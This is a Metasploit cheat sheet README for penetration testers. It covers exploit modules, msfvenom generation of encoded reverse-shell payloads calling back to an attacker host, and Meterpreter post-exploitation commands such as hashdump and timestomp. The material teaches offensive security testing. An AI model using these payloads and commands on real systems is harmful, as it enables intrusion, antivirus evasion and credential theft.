<h1>$${\color{red}Welcome} \space {\color{Goldenrod}To } \space {\color{blue}METASPLOIT}$$</h1>

<h1>Metasploit Cheat Sheet :shipit:</h1>


<p align="center">
<img src="https://github.com/4bo4yman/Metasploit_CheatSheet/assets/156849852/0a2e32cd-0949-4d48-9f1b-95faf99a7b96" height="300px" width="800px">
</p>

<br>

### Introduction:

Metasploit is the ultimate penetration testing tool for offensive security. And it’s so easy to use that even you could claim to be a hacker just by running a few commands. Also, it is incredibly powerful as well. This guide is a general overview of how Metasploit can be used.
**********

<h1>$${\color{yellow}1.} \space {\color{yellow}Getting } \space {\color{yellow}started}$$</h1>

Start the Metasploit console.

```
# Start the console
$ msfconsole
```
<br>

The console will now show the msf shell. You can provide commands on the shell to run various Metasploit modules.

Metasploit continuously adds new modules to its collection. To make sure you always have the latest exploits, run:

```
# Update the msf database
msf > msfupdate     
```
<br>
Metasploit is quite big and it’s easy to get lost around. If you need help, run:

```
 # Show help
msf > help
msf > help set        
```
The console output of the help command might feel overwhelming as well. But don’t worry. You’ll always have this blog post to help you out.
<br>
<br>


<h1>$${\color{yellow}2.} \space {\color{yellow}Metasploit } \space {\color{yellow}Modules}$$</h1>
Metasploit has thousands of modules. They are arranged in the following categories:

******************

> [!IMPORTANT]
> - <h4>Exploits</h4> It is the most commonly used module. It sends payloads to targets and executes them.
>  - <h4>Payloads</h4> It consists of code that runs remotely to exploit the target.
>  - <h4>Encoders</h4> It encodes a payload so that it is not detected by firewalls/anti-malware programs.
>  - <h4>Evasion</h4> While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, “evasion” modules will try that, with more or less success.
>  - <h4>Nops</h4> It keeps payload sizes consistent when encoders encode a payload. (Learn more about nop sled).
>  - <h4>Post</h4> It contains modules that assist post-exploitation.
>  - <h4>Auxillary</h4> It includes port scanners, fuzzers, sniffers, and other helper modules.


You can see the modules under each of these categories. Check what exists by running:

```
$ show exploits
$ show payloads
$ show auxillary
```
<br>
<br>


<h1>$${\color{yellow}3.} \space {\color{yellow}Searching } \space {\color{yellow}for} \space {\color{yellow}Modules }$$</h1>
If you’ve tried show exploits you’ve probably seen a huge list of modules. It’s impossible to go through this list and find what you need. You can use the search functionality to filter/look for your desired modules. Run:

```
$ search ftp
```
<br>

This will show you modules that have exploits for FTP servers. You can filter based on more criteria:

```
$ search ftp platform:windows rank:excellent
```
<br>
This will show excellently ranked FTP server exploits for windows machines. You can filter based on the following fields:

    name
    path
    platform
    type
    app
    author
    cve
    bid
    osdvb
<br>

> [!NOTE]
> Another essential piece of information returned is in the “rank” column. Exploits are rated based on their reliability. The table below provides their respective descriptions.

| Ranking | Description |
| --- | --- |
| **ExcellentRanking** | The exploit will never crash the service. This is the case for SQL Injection, CMD execution, RFI, LFI, etc. No typical memory corruption exploits should be given this ranking unless there are extraordinary circumstances (WMF Escape()). |
| **GreatRanking** | The exploit has a default target AND either auto-detects the appropriate target or uses an application-specific return address AFTER a version check. |
| **GoodRanking** | The exploit has a default target and it is the “common case” for this type of software (English, Windows 7 for a desktop app, 2012 for server, etc). Exploit does not auto-detect the target. |
| **NormalRanking** | The exploit is otherwise reliable, but depends on a specific version that is not the “common case” for this type of software and can’t (or doesn’t) reliably autodetect.  |
| **AverageRanking** | The exploit is generally unreliable or difficult to exploit, but has a success rate of 50% or more for common platforms.  |
| **LowRanking** | The exploit is nearly impossible to exploit (under 50% success rate) for common platforms.  |
| **ManualRanking** | The exploit is unstable or difficult to exploit and is basically a DoS (15% success rate or lower). This ranking is also used when the module has no use unless specifically configured by the user (e.g.: exploit/unix/webapp/php_eval).  |

> Source: https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking

<br>

> [!TIP]
> Please remember that exploits take advantage of a vulnerability on the target system and may always show unexpected behavior. A low-ranking exploit may work perfectly, and an excellent ranked exploit may not, or worse, crash the target system.




    
<br>
<br>


<h1>$${\color{yellow}4.} \space {\color{yellow}Run } \space {\color{yellow}an} \space {\color{yellow}Exploit }$$</h1>
The following series of shell commands are typically used to run an exploit using Metasploit.

At first select the module of your choice that you want to run for exploitation.

```
msf > use exploit/[ExploitModule]
```
<br>
Modules have multiple options that need to be set for execution. To see what options can be set, see the options:

```
msf > show options
```
<br>
After seeing the options, set their values like:

```
msf > set [Option] [Value]
msf > set RHOST 10.100.101.12       # example
msf > set RPORT 8000            # example
```
<br>
Now start the exploit:

```
msf > exploit
```
<br>
leave the context :

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > 
```

<br>
<br>

<h1>$${\color{yellow}5.} \space {\color{yellow}Make } \space {\color{yellow}Payloads} \space {\color{yellow}with } \space {\color{yellow}MSFvenom}$$</h1>

Sometimes you’ll need to create standalone files as payloads to send them to your target. Msfvenom is a CLI tool that can help with creating these files.
********
<h2>MSF Venom Command Options</h2>
<h3>Use these flags to generate reverse shell payloads.</h3>
At first search for payloads and encoders that msfvenom has. Payloads execute an attack and encoders encode a payload so that the payload can evade AVs.

```
SWITCH	          SYNTAX 	                          DESCRIPTION

-p	        –p (Payload option)	          Display payload standard options
–l	        –l ( list type)	                  List module type i .e payload, encoders
–f	        –f ( format )                     Output format
–e	        -e (encoder)	                  Define which encoder to use
-a	        –a (Architecture or platform	  Define which platform to use
-s	        -s (Space)	                  Define maximum payload capacity
-b	        -b (characters)	                  Define set of characters not to use
–i	        –i (Number of times)              Define number of times to use encoder
-x	        -x (File name)	                  Define a custom file to use as template
–o	        -o (output)	                  Save a payload
–h         	-h	                          Help

#example
$ msfvenom –p [PayloadPath] –f [FormatType] LHOST=[LocalHost (if reverse conn.)] LPORT=[LocalPort]
$ msfvenom -p windows/meterpreter/reverse_tcp -f exe  -e x86/shikata_ga_nai -i 5 LHOST=10.1.1.1 LPORT=4444 > met.exe

```
<br>
<br>


<p align="center">
<img src="https://github.com/4bo4yman/Metasploit_CheatSheet/assets/156849852/9a291a4f-78df-4137-87c8-ad0b87702853" height="300px" width="300px">
</p>

<br>
<br>
<h1>$${\color{yellow}EXAMPLES}$$</h1>


Search for module:

```
msf > search [regex]
```
<br>

Specify and exploit to use:

```
msf > use exploit/[ExploitPath]
```
<br>

Specify a Payload to use:

```
msf > set PAYLOAD [PayloadPath]
```
<br>

Show options for the current modules:

```
msf > show options
```
<br>

Set options:

```
msf > set [Option] [Value]
```
<br>

Start exploit:

```
msf > exploit 
```
<br>

Useful Auxiliary Modules


Port Scanner:

```
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 10.10.10.0/24
msf > run
```
<br>

DNS Enumeration:

```
msf > use auxiliary/gather/dns_enum
msf > set DOMAIN target.tgt
msf > run
```
<br>

FTP Server:

```
msf > use auxiliary/server/ftp
msf > set FTPROOT /tmp/ftproot
msf > run
```
<br>

Proxy Server:

```
msf > use auxiliary/server/socks4
msf > run 
```
<br>

information on any module :

```
msf > info exploit/windows/smb/ms17_010_eternalblue
msf exploit(windows/smb/ms17_010_eternalblue) > info
```

<br>

msfvenom :

The msfvenom tool can be used to generate Metasploit payloads (such as Meterpreter) as standalone files and optionally encode 
them. This tool replaces the former msfpayload and msfencode tools. Run with ‘'-l payloads’ to get a list of payloads.

```
$ msfvenom –p [PayloadPath] –f [FormatType] LHOST=[LocalHost (if reverse conn.)] LPORT=[LocalPort]
```
<br>

> [!NOTE]
> 
>   Parameters you will often use are:
> 
> - <h4>RHOSTS</h4> “Remote host”, the IP address of the target system. A single IP address or a network range can be set. This will support the CIDR (Classless Inter-Domain Routing) notation (/24, /16, etc.) or a network range (10.10.10.x – 10.10.10.y). You can also use a file where targets are listed, one target per line using file:/path/of/the/target_file.txt, as you can see below.
>    <p align="center"><img src="https://github.com/4bo4yman/Metasploit_CheatSheet/assets/156849852/560c8649-16c5-40e2-911f-56070d30ad3e" height="300px" width="800px"></p>
>  - <h4>RPORT</h4> “Remote port”, the port on the target system the vulnerable application is running on.
>  - <h4>PAYLOAD</h4> The payload you will use with the exploit.
>  - <h4>LHOST</h4> “Localhost”, the attacking machine (your AttackBox or Kali Linux) IP address.
>  - <h4>LPORT</h4> “Local port”, the port you will use for the reverse shell to connect back to. This is a port on your attacking machine, and you can set it to any port not used by any other application.
>  - <h4>SESSION</h4> Each connection established to the target system using Metasploit will have a session ID. You will use this with post-exploitation modules that will connect to the target system using an existing connection.


<br>
Example :

Reverse Meterpreter payload as an executable and redirected into a file:

```
$ msfvenom -p windows/meterpreter/ reverse_tcp -f exe LHOST=10.1.1.1 LPORT=4444 > met.exe
```
<br>

Format Options (specified with –f) --help-formats – List available output formats

> exe – Executable
> pl – Perl
> rb – Ruby
> raw – Raw shellcode
> c – C code

<br>

Encoding Payloads with msfvenom

The msfvenom tool can be used to apply a level of encoding for anti-virus bypass. Run with '-l encoders'
to get a list of encoders.

```
$ msfvenom -p [Payload] -e [Encoder] -f [FormatType] -i [EncodeInterations] LHOST=[LocalHost (if reverse conn.)] LPORT=[LocalPort]
```
<br>

Example:
<br>

Encode a payload from msfpayload 5 times using shikata-ga-nai encoder and output as executable:

```
$ msfvenom -p windows/meterpreter/ reverse_tcp -i 5 -e x86/shikata_ga_nai -f exe LHOST=10.1.1.1 LPORT=4444 > msf.exe
```

<br>

Other Payloads:

> Linux Executable and Linkable Format (elf)

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```

> Windows

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```

> PHP

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```

> ASP

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
```

> Python

```
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```


<br>

<h3>Metasploit Meterpreter</h3>

Base Commands: 

> ? / help: Display a summary of commands exit / quit: Exit the Meterpreter session

> sysinfo: Show the system name and OS type

> shutdown / reboot: Self-explanatory

File System Commands:

> cd: Change directory

> lcd: Change directory on local (attacker's) machine

> pwd / getwd: Display current working directory

> ls: Show the contents of the directory

> cat: Display the contents of a file on screen

> download / upload: Move files to/from the target machine

> mkdir / rmdir: Make / remove directory

> edit: Open a file in the default editor (typically vi)

Process Commands:

> getpid: Display the process ID that Meterpreter is running inside.

> getuid: Display the user ID that Meterpreter is running with.

> ps: Display process list.

> kill: Terminate a process given its process ID.

> execute: Run a given program with the privileges of the process the Meterpreter is loaded in.

> migrate: Jump to a given destination process ID

- Target process must have same or lesser privileges

- Target process may be a more stable process

- When inside a process, can access any files that process has a lock on.

Network Commands:

> ipconfig: Show network interface information

> portfwd: Forward packets through TCP session

> route: Manage/view the system's routing table

Misc Commands:

> idletime: Display the duration that the GUI of thetarget machine has been idle.

> uictl [enable/disable] [keyboard/mouse]: Enable/disable either the mouse or keyboard of the target machine.

> screenshot: Save as an image a screenshot of the target machine.

Additional Modules:

> use [module]: Load the specified module

> Example:

> use priv: Load the priv module

> hashdump: Dump the hashes from the box

> timestomp:Alter NTFS file timestamps

Managing Sessions:

Multiple Exploitation: 

Run the exploit expecting a single session that is immediately backgrounded:

```
msf > exploit -z
```
<br>

Run the exploit in the background expecting one or more sessions that are immediately backgrounded:

```
msf > exploit –j
```
<br>

List all current jobs (usually exploit listeners):

```
msf > jobs –l
```
<br>


Kill a job:

```
msf > jobs –k [JobID]
```
<br>

Multiple Sessions:

List all backgrounded sessions:

```
msf > sessions -l
```
<br>

Interact with a backgrounded session:

```
msf > session -i [SessionID]
```
<br>

Background the current interactive session:

```
meterpreter > <Ctrl+Z>
or
meterpreter > background
```
<br>

Routing Through Sessions:

All modules (exploits/post/aux) against the target subnet mask will be pivoted through this session.

```
msf > route add [Subnet to Route To] [Subnet Netmask] [SessionID]
```
<br>

if this cheat_sheet liked you, follow me [Here](https://github.com/4bo4yman) ;)


